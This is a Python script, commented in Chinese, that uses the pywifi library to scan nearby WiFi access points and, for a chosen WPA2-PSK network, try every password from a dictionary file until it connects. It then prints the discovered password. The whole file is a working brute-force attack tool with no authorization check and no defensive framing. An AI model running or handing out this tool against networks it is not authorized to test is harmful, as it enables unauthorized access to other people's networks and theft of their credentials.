from pywifi import PyWiFi, const, Profile
from time import sleep
from os import path


def load_dict(password_dict_path):
    """
    加载密码字典
    :param password_dict_path: 密码字典文件路径
    :return: 密码集合（如果文件不存在则返回None）
    """
    if not path.exists(password_dict_path):
        print("字典文件不存在")
        return None

    password_set = set()
    with open(password_dict_path, "r") as password_file:
        for password in password_file:
            password = password.strip()  # 去除每行的前后空格和换行符
            if password:
                password_set.add(password)  # 将密码加入集合

    return password_set


def get_wireless_interface():
    """
    获取无线网卡接口
    :return: 选择的无线网卡接口
    """
    wifi = PyWiFi()
    wireless_interfaces = wifi.interfaces()

    if not wireless_interfaces:
        print('没有找到无线网卡!')
        exit(0)

    print('已找到以下网卡:')
    interface_status = {0: '断开连接', 1: "正在扫描", 2: "已启用", 3: '正在连接', 4: '已连接'}
    for index, interface in enumerate(wireless_interfaces, start=1):
        print(f'{index}. {interface.name()} - {interface_status[interface.status()]}')

    while True:
        try:
            choice = int(input('请选择无线网卡的编号: '))
            if 1 <= choice <= len(wireless_interfaces):
                return wireless_interfaces[choice - 1]  # 返回用户选择的无线网卡接口
            else:
                print('选择错误，请重新输入!')
        except ValueError:
            print('输入错误，请重新输入!')


def scan_aps(interface):
    """
    扫描AP，并去重
    :param interface: 无线网卡接口
    :return: 可用AP的字典
    """
    interface.scan()  # 开始扫描
    sleep(2)  # 等待扫描完成
    scan_results = interface.scan_results()

    available_aps = {}
    for index, ap in enumerate(scan_results, start=1):
        ap_info = {"akm": ap.akm, "ssid": ap.ssid, "bssid": ap.bssid, "cipher": ap.cipher, "auth": ap.auth}
        if ap_info not in available_aps.values():  # 去重
            available_aps[index] = ap_info

    for index, info in available_aps.items():
        print(
            f"AP编号{index} 秘钥管理类型{info['akm']} 名称：{info['ssid']} MAC地址：{info['bssid']} "
            f"密码加密类型：{info['cipher']} 认证算法的类型：{info['auth']}")

    return available_aps


def connect_to_ap(interface, ap_info, password=None):
    """
    连接到指定AP
    :param interface: 无线网卡接口
    :param ap_info: AP信息
    :param password: 密码（如果AP需要）
    :return: 连接是否成功
    """
    interface.remove_all_network_profiles()  # 删除所有配置文件
    profile = Profile()
    profile.ssid = ap_info['ssid']
    profile.bssid = ap_info['bssid']

    if password:
        profile.auth = const.AUTH_ALG_OPEN
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.key = password
        if len(password) < 8:
            print("密码长度不足8位，请重新输入!")
            return False
    else:
        profile.auth = const.AUTH_ALG_OPEN

    interface.add_network_profile(profile)  # 添加配置文件
    interface.connect(profile)  # 连接到AP
    sleep(4)

    return interface.status() == const.IFACE_CONNECTED  # 返回连接状态


if __name__ == '__main__':
    interface = get_wireless_interface()

    # 检查网卡状态
    if interface.status() != const.IFACE_DISCONNECTED:
        while True:
            reconnect = input(f'网卡{interface.name()}已连接，是否重新连接?(y/n): ').lower()
            match reconnect:
                case 'y':
                    break
                case 'n':
                    print('已退出!')
                    exit(0)
                case _:
                    print('输入错误，请重新输入!')

    available_aps = scan_aps(interface)

    while True:
        try:
            ap_choice = int(input('请选择要连接的AP的编号: '))
            if 1 <= ap_choice <= len(available_aps):
                break
            else:
                print('选择错误，请重新输入!')
        except ValueError:
            print('输入错误，请重新输入!')

    chosen_ap = available_aps[ap_choice]

    # 根据AP的akm类型选择连接方式
    match chosen_ap['akm']:
        case [4]:  # AP需要密码
            passwords = load_dict("password.dic")
            if not passwords:
                exit(0)

            for passwd in passwords:
                if connect_to_ap(interface, chosen_ap, passwd):
                    print(f'\033[32m{interface.name()}网卡已连接到WiFi:{chosen_ap["ssid"]} 密码为:{passwd}\033[0m')
                    break
                else:
                    print(f'\033[31m{interface.name()}网卡连接WiFi{chosen_ap["ssid"]}失败 密码为:{passwd}\033[0m')
        case [0]:  # AP不需要密码
            if connect_to_ap(interface, chosen_ap):
                print(f'\033[32m{interface.name()}网卡已连接到WiFi{chosen_ap["ssid"]}!\033[0m')
            else:
                print(f'\033[31m{interface.name()}网卡连接WiFi{chosen_ap["ssid"]}失败!\033[0m')
        case _:
            print('未知的AKM类型，无法连接!')
